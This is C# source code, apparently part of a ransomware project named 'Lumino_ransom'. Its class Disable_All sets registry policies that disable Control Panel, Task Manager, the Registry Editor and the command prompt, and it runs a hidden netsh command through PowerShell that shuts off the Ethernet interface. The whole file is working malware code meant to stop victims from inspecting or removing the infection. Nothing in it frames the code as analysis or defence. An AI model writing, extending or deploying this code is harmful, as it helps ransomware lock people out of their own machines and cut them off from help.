using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Lumino_ransom
{
    internal class Disable_All
    {

        public void Disable_Parameter()
        {
            try
            {

                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                       @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                objRegistryKey.GetValue("NoControlPanel");
                objRegistryKey.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);
                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }
        }

        public void Internet_Dis()
        {
            try
            {
            Process mtd = new Process();
            mtd.StartInfo.FileName = "powershell.exe";
            mtd.StartInfo.Arguments = "/C netsh interface set interface name=\"Ethernet\" admin=Disabled";
            mtd.StartInfo.UseShellExecute = true;
            mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            mtd.Start();
            mtd.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }
        }


        public void Disble_Taskmgr()
        {
            try
            {

                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                objRegistryKey.GetValue("DisableTaskMgr");
                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }

        }


        public void Disble_Registry()
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                objRegistryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);

                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }

        }

        public void Disble_CMD()
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
        @"Software\Policies\Microsoft\Windows\System");
                objRegistryKey.SetValue("DisableCMD", "1", RegistryValueKind.DWord);

                objRegistryKey.Close();
            }
            catch (System.AccessViolationException) { }
            catch (System.UnauthorizedAccessException) { }

        }

    }
}
